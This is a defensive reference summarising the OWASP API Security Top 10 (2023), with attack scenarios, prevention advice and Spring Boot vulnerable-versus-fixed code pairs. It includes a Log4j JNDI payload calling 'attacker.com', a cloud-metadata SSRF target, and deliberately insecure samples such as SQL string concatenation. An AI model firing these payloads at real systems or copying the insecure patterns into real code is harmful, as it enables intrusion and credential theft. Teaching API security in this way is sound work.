# OWASP API Security Top 10 (2023)

This reference is loaded by the `security-pen-tester` skill when performing security analysis
on APIs and backend services. Guidelines are drawn from OWASP's API Security Project.

**Source:** https://owasp.org/API-Security/editions/2023/en/0x00-header/
**Version:** 2023 Edition

---

## Table of Contents

1. [API1:2023 - Broken Object Level Authorization](#api12023---broken-object-level-authorization)
2. [API2:2023 - Broken Authentication](#api22023---broken-authentication)
3. [API3:2023 - Broken Object Property Level Authorization](#api32023---broken-object-property-level-authorization)
4. [API4:2023 - Unrestricted Resource Consumption](#api42023---unrestricted-resource-consumption)
5. [API5:2023 - Broken Function Level Authorization](#api52023---broken-function-level-authorization)
6. [API6:2023 - Unrestricted Access to Sensitive Business Flows](#api62023---unrestricted-access-to-sensitive-business-flows)
7. [API7:2023 - Server Side Request Forgery](#api72023---server-side-request-forgery)
8. [API8:2023 - Security Misconfiguration](#api82023---security-misconfiguration)
9. [API9:2023 - Improper Inventory Management](#api92023---improper-inventory-management)
10. [API10:2023 - Unsafe Consumption of APIs](#api102023---unsafe-consumption-of-apis)

---

## API1:2023 - Broken Object Level Authorization

### Overview
Broken Object Level Authorization (BOLA) represents a critical API security vulnerability where attackers manipulate object identifiers to access resources belonging to other users without proper authorization checks.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Widespread |
| Detectability | Easy |
| Technical Impact | Severe |

### Vulnerability Description
The core issue involves attackers who can exploit API endpoints by manipulating the ID of an object that is sent within the request. Object identifiers appear in URL paths, query parameters, headers, or request bodies and are easy to identify in the request target.

This vulnerability stems from a common architectural pattern where APIs rely on client-provided parameters to determine resource access rather than enforcing server-side authorization checks.

### Attack Scenarios

**Scenario 1 - E-commerce Revenue Data:**
An attacker identifies API patterns like `/shops/{shopName}/revenue_data.json`, obtains shop names through another endpoint, then systematically accesses sales data across thousands of stores by manipulating the shop name parameter.

**Scenario 2 - Vehicle Remote Control:**
A vehicle API fails to verify ownership of the Vehicle Identification Number, allowing attackers to remotely control vehicles they don't own.

**Scenario 3 - Document Deletion:**
A GraphQL mutation deletes documents by ID without verifying the requester owns the document, enabling users to delete others' files.

### Prevention Measures
- Implement authorization mechanisms based on user policies and hierarchies
- Enforce authorization checks in every function accessing database records via client input
- Utilize unpredictable, random values (GUIDs) for record IDs
- Develop and maintain tests evaluating authorization mechanism security

### Spring Boot Example

```java
// BAD - No authorization check
@GetMapping("/orders/{orderId}")
public OrderDTO getOrder(@PathVariable Long orderId) {
    return orderRepository.findById(orderId)
        .map(orderMapper::toDTO)
        .orElseThrow();
}

// GOOD - Authorization check enforced
@GetMapping("/orders/{orderId}")
public OrderDTO getOrder(@PathVariable Long orderId,
                         @AuthenticationPrincipal UserDetails user) {
    Order order = orderRepository.findById(orderId)
        .orElseThrow(() -> new ResourceNotFoundException("Order not found"));

    if (!order.getUserId().equals(user.getId())) {
        throw new ForbiddenException("Access denied");
    }

    return orderMapper.toDTO(order);
}
```

---

## API2:2023 - Broken Authentication

### Overview
Broken Authentication represents a critical vulnerability where authentication mechanisms fail to properly verify user identity. The authentication mechanism is an easy target for attackers since it's exposed to everyone.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Common |
| Detectability | Easy |
| Technical Impact | Severe |

### Vulnerability Indicators

An API exhibits broken authentication if it:
- Allows credential stuffing attacks without safeguards
- Lacks brute-force protections (captcha, account lockout)
- Accepts weak passwords
- Transmits authentication credentials in URLs
- Permits sensitive operations without password re-verification
- Fails to validate token authenticity
- Accepts unsigned JWT tokens with `{"alg":"none"}`
- Ignores JWT expiration dates
- Employs inadequate password encryption or weak hashing

### Attack Scenarios

**Scenario 1 - GraphQL Query Batching:**
Attackers bypass rate limiting on login endpoints by batching multiple GraphQL queries simultaneously, enabling rapid brute-force attempts against victim accounts.

**Scenario 2 - Account Takeover:**
An attacker with stolen authentication tokens can change account email addresses without requiring password confirmation, then initiate password reset workflows to gain complete account control.

### Prevention Strategies
- Implementing multi-factor authentication
- Applying strict anti-brute-force mechanisms exceeding standard rate limiting
- Requiring re-authentication for sensitive operations
- Enforcing account lockout and CAPTCHA protections
- Using industry-standard authentication practices
- Treating password reset flows as login endpoints for security purposes

### Spring Boot Example

```java
// BAD - No rate limiting, weak password policy
@PostMapping("/login")
public AuthResponse login(@RequestBody LoginRequest request) {
    User user = userRepository.findByEmail(request.getEmail())
        .orElseThrow();
    if (passwordEncoder.matches(request.getPassword(), user.getPassword())) {
        return new AuthResponse(jwtUtil.generateToken(user));
    }
    throw new UnauthorizedException("Invalid credentials");
}

// GOOD - Rate limiting, brute-force protection
@PostMapping("/login")
@RateLimited(requests = 5, window = "1m", key = "#request.email")
public AuthResponse login(@RequestBody @Valid LoginRequest request,
                          HttpServletRequest httpRequest) {
    // Check for account lockout
    if (loginAttemptService.isBlocked(request.getEmail())) {
        throw new TooManyRequestsException("Account temporarily locked");
    }

    User user = userRepository.findByEmail(request.getEmail())
        .orElse(null);

    if (user == null || !passwordEncoder.matches(request.getPassword(),
                                                  user.getPassword())) {
        loginAttemptService.recordFailedAttempt(request.getEmail());
        throw new UnauthorizedException("Invalid credentials");
    }

    loginAttemptService.clearFailedAttempts(request.getEmail());
    return new AuthResponse(jwtUtil.generateToken(user));
}
```

---

## API3:2023 - Broken Object Property Level Authorization

### Overview
This vulnerability involves APIs that expose sensitive object properties or allow unauthorized modification of internal properties that users shouldn't access.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Common |
| Detectability | Moderate |
| Technical Impact | Moderate |

### Vulnerability Description
APIs frequently expose all object properties in responses. The weakness arises when:
- APIs return sensitive properties users shouldn't read
- APIs permit modification of properties users shouldn't change

Unauthorized access to private/sensitive object properties may result in data disclosure, data loss, or data corruption.

### Attack Scenarios

**Scenario 1 - Data Disclosure:**
A dating app's report function returns sensitive user details like "fullName" and "recentLocation" in the response, exposing information the reporter shouldn't access.

**Scenario 2 - Mass Assignment:**
A marketplace host exploits an approval endpoint by injecting a "total_stay_price" parameter, fraudulently increasing charges beyond the agreed amount.

**Scenario 3 - Property Manipulation:**
A content creator bypasses video blocks by adding a "blocked: false" parameter to an update request, circumventing moderation controls.

### Prevention Strategies
- Returning only necessary properties rather than entire objects
- Avoiding automatic serialization methods like `to_json()`
- Restricting which properties can be modified
- Implementing schema-based response validation
- Minimizing data structures to functional requirements

### Spring Boot Example

```java
// BAD - Exposes all entity fields, allows mass assignment
@PutMapping("/users/{id}")
public User updateUser(@PathVariable Long id, @RequestBody User user) {
    return userRepository.save(user);  // Mass assignment vulnerability!
}

// GOOD - Use DTOs with explicit field mapping
@PutMapping("/users/{id}")
public UserResponseDTO updateUser(@PathVariable Long id,
                                   @RequestBody @Valid UpdateUserRequest request,
                                   @AuthenticationPrincipal UserDetails user) {
    User existingUser = userRepository.findById(id)
        .orElseThrow(() -> new ResourceNotFoundException("User not found"));

    // Only allow updating specific fields
    existingUser.setName(request.getName());
    existingUser.setEmail(request.getEmail());
    // Role, password, status NOT updated from request

    return userMapper.toResponseDTO(userRepository.save(existingUser));
}
```

---

## API4:2023 - Unrestricted Resource Consumption

### Overview
This vulnerability occurs when APIs lack appropriate limits on resource consumption, potentially leading to denial of service or unexpected operational costs.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Widespread |
| Detectability | Easy |
| Technical Impact | Severe |

### Vulnerability Description
APIs are vulnerable when missing or inappropriately configured limits for:
- Execution timeouts
- Memory allocation
- File descriptors
- Processes
- Upload file size
- Batch operations
- Pagination
- Third-party spending caps

### Attack Scenarios

**Scenario 1 - SMS Spam Attack:**
An attacker exploits a password recovery flow by repeatedly triggering SMS delivery requests. A script sends tens of thousands of API calls, causing the backend to request thousands of text messages from a third-party provider, resulting in thousands of dollars in charges within minutes.

**Scenario 2 - GraphQL Batching Exploitation:**
Despite rate limiting protections, an attacker bypasses restrictions by batching 999 image upload mutations in a single request. Since the API doesn't limit operation frequency within batch requests, the server exhausts memory processing all uploads simultaneously.

**Scenario 3 - Unexpected Cloud Costs:**
Clients download an 18GB file without consumption alerts or spending limits configured. The monthly bill increases from $13 to $8,000 due to uncontrolled bandwidth usage.

### Prevention Measures
- Use containerized/serverless solutions limiting memory, CPU, and processes
- Define maximum sizes for all parameters and payloads
- Implement rate limiting tailored to business needs
- Validate server-side parameters controlling response record counts
- Configure spending limits or billing alerts for third-party integrations

### Spring Boot Example

```java
// Configuration for request limits
@Configuration
public class WebConfig implements WebMvcConfigurer {

    @Override
    public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
        // Limit request body size
        for (HttpMessageConverter<?> converter : converters) {
            if (converter instanceof MappingJackson2HttpMessageConverter) {
                ((MappingJackson2HttpMessageConverter) converter)
                    .setDefaultCharset(StandardCharsets.UTF_8);
            }
        }
    }
}

// Controller with pagination limits
@GetMapping("/items")
public Page<ItemDTO> getItems(
        @RequestParam(defaultValue = "0") @Min(0) int page,
        @RequestParam(defaultValue = "20") @Min(1) @Max(100) int size) {
    return itemService.getItems(PageRequest.of(page, size));
}

// File upload with size validation
@PostMapping("/upload")
public ResponseEntity<?> uploadFile(
        @RequestParam("file") MultipartFile file) {
    if (file.getSize() > 10 * 1024 * 1024) {  // 10MB limit
        throw new PayloadTooLargeException("File exceeds maximum size");
    }
    // Process file...
}
```

---

## API5:2023 - Broken Function Level Authorization

### Overview
This vulnerability involves authorization flaws where attackers access API endpoints they shouldn't reach. Exploitation is straightforward—attackers simply send legitimate API calls to API endpoints that they should not have access to.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Common |
| Detectability | Easy |
| Technical Impact | Severe |

### Vulnerability Description
The core issue stems from inadequate authorization checks at the function level. Modern applications with complex role hierarchies and user groups create conditions where developers struggle to implement proper restrictions consistently.

### Attack Scenarios

**Scenario 1 - Admin Endpoint Discovery:**
During user registration, an attacker discovers a `POST /api/invites/new` endpoint meant only for administrators:

```json
POST /api/invites/new
{
  "email": "[email protected]",
  "role": "admin"
}
```

They create an admin account without proper authorization validation.

**Scenario 2 - Unprotected Admin Data:**
An attacker discovers `GET /api/admin/v1/users/all` lacking function-level authorization, exposing sensitive user data through the unprotected endpoint.

### Detection Approach
Security teams should examine whether:
- Regular users can access administrative endpoints
- HTTP method changes (GET→DELETE) bypass restrictions
- Users can guess URLs to access unauthorized functions

### Prevention Strategies
1. **Default-Deny Model:** Require explicit authorization grants for each function
2. **Architectural Controls:** Use abstract controllers with built-in authorization checks
3. **Comprehensive Review:** Audit all endpoints against authorization flaws while considering business logic
4. **Hierarchical Protection:** Ensure administrative functions within regular controllers validate user roles

### Spring Boot Example

```java
// BAD - Authorization by URL pattern only
@RestController
@RequestMapping("/api/admin")
public class AdminController {
    @GetMapping("/users")
    public List<UserDTO> getAllUsers() {
        return userService.findAll();
    }
}

// GOOD - Method-level authorization
@RestController
@RequestMapping("/api/admin")
@PreAuthorize("hasRole('ADMIN')")  // Class-level protection
public class AdminController {

    @GetMapping("/users")
    @PreAuthorize("hasAuthority('USER_READ')")  // Method-level protection
    public List<UserDTO> getAllUsers() {
        return userService.findAll();
    }

    @DeleteMapping("/users/{id}")
    @PreAuthorize("hasAuthority('USER_DELETE')")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
}
```

---

## API6:2023 - Unrestricted Access to Sensitive Business Flows

### Overview
This vulnerability occurs when APIs expose sensitive business processes without proper access controls. Exploitation usually involves understanding the business model backed by the API, finding sensitive business flows, and automating access to these flows.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Widespread |
| Detectability | Average |
| Technical Impact | Moderate |
| Business Impact | Organization-specific |

### Common Sensitive Business Flows
- **Product purchasing** - attackers can monopolize limited inventory and resell at inflated prices (scalping)
- **Content creation** - automated spam posting systems
- **Reservation systems** - blocking legitimate user access by reserving all availability

### Attack Scenarios

**Scenario 1 - Gaming Console Scalping:**
Attackers use distributed code across multiple IPs to purchase majority stock before reselling at higher prices.

**Scenario 2 - Airline Ticket Manipulation:**
Malicious actors book 90% of seats, cancel them days before departure to force discounts, then purchase at reduced prices.

**Scenario 3 - Referral Program Abuse:**
Automated scripts create fake accounts to accumulate credits used for free rides or account resale.

### Prevention Strategies

**Business Layer:**
- Identify workflows vulnerable to excessive exploitation specific to your business model

**Engineering Layer:**
- **Device fingerprinting** - block headless browsers and unexpected clients
- **Human verification** - use CAPTCHA or biometric authentication
- **Behavior analysis** - detect non-human patterns (e.g., completing purchase in under one second)
- **Network controls** - block Tor exit nodes and known proxies
- **Access restriction** - secure machine-to-machine APIs with stricter controls

---

## API7:2023 - Server Side Request Forgery

### Overview
Server-Side Request Forgery (SSRF) flaws occur when an API is fetching a remote resource without validating the user-supplied URL. This vulnerability enables attackers to direct applications toward unexpected destinations, circumventing firewalls and VPNs.

### Why SSRF Is Growing
Modern development practices have made SSRF more prevalent:
- Webhooks
- File fetching from URLs
- Custom SSO implementations
- URL preview features

Cloud platforms (AWS, Kubernetes, Docker) expose management interfaces via HTTP on predictable paths, creating attractive targets.

### Attack Scenarios

**Scenario 1 - Port Scanning:**
A social network's image upload feature accepts picture URLs. An attacker submits `localhost:8080` as the URL, using response timing to determine whether internal ports are open.

**Scenario 2 - Credential Theft:**
A security product's webhook creation endpoint tests URLs by making requests. An attacker provides a cloud metadata service URL (`169.254.169.254`), causing the server to expose IAM credentials.

### Prevention Strategies
- Isolate resource-fetching mechanisms from internal networks
- Implement allowlists for remote origins, URL schemes, ports, and media types
- Disable HTTP redirections
- Use reliable URL parsing libraries
- Validate all client input thoroughly
- Never return raw responses directly to clients

### Spring Boot Example

```java
// BAD - No URL validation
@PostMapping("/fetch-image")
public byte[] fetchImage(@RequestBody String imageUrl) throws IOException {
    URL url = new URL(imageUrl);
    return url.openStream().readAllBytes();  // SSRF vulnerability!
}

// GOOD - URL validation with allowlist
@PostMapping("/fetch-image")
public byte[] fetchImage(@RequestBody @Valid ImageFetchRequest request) {
    String imageUrl = request.getUrl();

    // Validate URL scheme
    if (!imageUrl.startsWith("https://")) {
        throw new BadRequestException("Only HTTPS URLs allowed");
    }

    // Parse and validate host
    URL url = new URL(imageUrl);
    String host = url.getHost();

    // Block internal/private IPs
    if (isPrivateIP(host) || isLoopback(host)) {
        throw new ForbiddenException("Internal URLs not allowed");
    }

    // Check allowlist
    if (!allowedDomains.contains(host)) {
        throw new ForbiddenException("Domain not in allowlist");
    }

    // Fetch with timeout and size limits
    return httpClient.fetchWithLimits(imageUrl, maxSize, timeout);
}
```

---

## API8:2023 - Security Misconfiguration

### Overview
Security misconfiguration represents a pervasive vulnerability affecting any level of the API stack. Attackers will often attempt to find unpatched flaws, common endpoints, services running with insecure default configurations, or unprotected files and directories.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Widespread |
| Detectability | Easy |
| Technical Impact | Severe |

### Vulnerability Indicators
An API is vulnerable when it exhibits:
- Inadequate security hardening across any API component
- Misconfigured cloud service permissions
- Missing security patches or outdated systems
- Enabled unnecessary features (HTTP verbs, logging capabilities)
- Inconsistent request processing across HTTP server chains
- Absence of Transport Layer Security (TLS) encryption
- Missing security or cache control headers
- Improper or absent CORS policies
- Error messages exposing stack traces or sensitive information

### Attack Scenarios

**Scenario 1 - Log4j JNDI Injection:**
A logging utility with JNDI lookups enabled by default processes requests containing malicious placeholders. An attacker includes `${jndi:ldap://attacker.com/Malicious.class}` in a request header, causing remote code execution.

**Scenario 2 - Cache Exposure:**
An API response lacks `Cache-Control` headers, allowing private user conversation data to persist in browser cache files.

### Prevention Strategies
- Repeatable hardening processes for rapid deployment of secured environments
- Configuration reviews across orchestration files, API components, and cloud services
- Automated continuous assessment of configuration effectiveness
- Mandatory TLS encryption for all API communications
- HTTP verb restrictions (disable unnecessary verbs like HEAD)
- Proper CORS policies and security headers for browser-based clients
- Content-type restrictions matching business requirements
- Enforced API response schemas preventing information disclosure

### Spring Boot Example

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives(
                    "default-src 'self'; frame-ancestors 'none'"))
                .frameOptions(frame -> frame.deny())
                .xssProtection(xss -> xss.headerValue(
                    XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .cacheControl(cache -> {})  // Disables caching
            )
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.disable())  // Only if using JWT
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS));

        return http.build();
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://trusted-domain.com"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);
        return source;
    }
}
```

---

## API9:2023 - Improper Inventory Management

### Overview
This vulnerability addresses the risks associated with poor visibility and management of API assets, including undocumented endpoints, outdated versions, and unmonitored data flows.

### Core Issues

**Documentation Blindspots:**
- The purpose of an API host is unclear
- No explicit answers about environment, access, and version
- Documentation is missing or outdated
- No retirement strategy exists for API versions

**Data Flow Blindspots:**
- Sensitive data sharing with third parties lacks business justification
- No visibility or classification of what data is exchanged

### Attack Scenarios

**Scenario 1 - Beta Endpoint Exploitation:**
A beta API endpoint (`beta.api.socialnetwork.owasp.org`) ran identical functionality to production but lacked rate-limiting security controls. An attacker exploited this gap to brute-force password reset tokens.

**Scenario 2 - Third-Party Data Leak:**
A social network's third-party integration system allowed independent apps to access not only user information but also private information of all their friends, enabling unauthorized exposure of 50 million users' data.

### Prevention Strategies
- Maintain comprehensive inventory of all API hosts with documented environment, access controls, and versions
- Monitor and document integrated services, their roles, data exchanges, and sensitivity levels
- Auto-generate documentation through open standards integrated into CI/CD pipelines
- Apply security controls consistently across all API versions, not just production
- Conduct risk analysis when updating versions to determine backport feasibility or deprecation timelines

---

## API10:2023 - Unsafe Consumption of APIs

### Overview
This vulnerability occurs when APIs interact with third-party services without proper security controls. Developers often trust external APIs more than user input, leading to relaxed security standards.

### Risk Rating
| Factor | Level |
|--------|-------|
| Exploitability | Easy |
| Prevalence | Common |
| Detectability | Average |
| Technical Impact | Severe |

### Vulnerability Indicators
An API is vulnerable when it:
- Communicates with external services over unencrypted channels
- Fails to validate data from third-party APIs before processing
- Automatically follows redirects without restrictions
- Lacks resource limits for handling third-party responses
- Omits timeouts for external service interactions

### Attack Scenarios

**Scenario 1 - Injection via Third-Party Data:**
A system enriches addresses through a third-party service. Attackers inject SQL payloads into that service, then trigger the vulnerable API to retrieve and execute the malicious data.

**Scenario 2 - Redirect Exploitation:**
An attacker compromises a third-party service to respond with "308 Permanent Redirect" pointing to attacker-controlled servers. The vulnerable API blindly follows these redirects, exposing sensitive data.

**Scenario 3 - Repository Name Injection:**
An attacker creates a Git repository with an SQL injection payload in its name. When the application integrates with this repository, the malicious payload executes.

### Prevention Strategies
- Assess service providers' API security practices before integration
- Enforce encrypted communication channels (TLS) for all interactions
- Validate and sanitize all incoming third-party data thoroughly
- Maintain allowlists for permitted redirect destinations
- Implement timeouts and circuit breakers for external calls

### Spring Boot Example

```java
// BAD - Trusting third-party data
@Service
public class AddressEnrichmentService {

    public Address enrichAddress(String zipCode) {
        // Fetch from third-party
        ThirdPartyResponse response = restTemplate
            .getForObject(thirdPartyUrl + zipCode, ThirdPartyResponse.class);

        // Directly using response in query - INJECTION RISK!
        return jdbcTemplate.queryForObject(
            "SELECT * FROM addresses WHERE city = '" + response.getCity() + "'",
            addressMapper);
    }
}

// GOOD - Validate and sanitize third-party data
@Service
public class AddressEnrichmentService {

    private final RestTemplate secureRestTemplate;

    public AddressEnrichmentService() {
        this.secureRestTemplate = new RestTemplateBuilder()
            .setConnectTimeout(Duration.ofSeconds(5))
            .setReadTimeout(Duration.ofSeconds(10))
            .build();
    }

    public Address enrichAddress(String zipCode) {
        ThirdPartyResponse response;
        try {
            response = secureRestTemplate
                .getForObject(thirdPartyUrl + zipCode, ThirdPartyResponse.class);
        } catch (Exception e) {
            log.warn("Third-party service failed", e);
            throw new ServiceUnavailableException("Address enrichment unavailable");
        }

        // Validate response
        if (response == null || !isValidCity(response.getCity())) {
            throw new BadRequestException("Invalid response from third party");
        }

        // Use parameterized query
        return jdbcTemplate.queryForObject(
            "SELECT * FROM addresses WHERE city = ?",
            new Object[]{response.getCity()},
            addressMapper);
    }
}
```

---

## Quick Reference Matrix

| Risk | Primary Defense | Key CWE |
|------|-----------------|---------|
| API1: BOLA | Server-side authorization checks | CWE-284 |
| API2: Broken Auth | MFA, rate limiting, account lockout | CWE-287 |
| API3: Property Auth | DTOs, explicit field mapping | CWE-213 |
| API4: Resource Consumption | Rate limiting, pagination limits | CWE-770 |
| API5: Function Auth | @PreAuthorize, RBAC | CWE-285 |
| API6: Business Flow | CAPTCHA, behavior analysis | CWE-799 |
| API7: SSRF | URL validation, allowlists | CWE-918 |
| API8: Misconfiguration | Security headers, TLS, hardening | CWE-16 |
| API9: Inventory | API documentation, versioning | CWE-1059 |
| API10: Unsafe Consumption | Input validation, timeouts | CWE-20 |
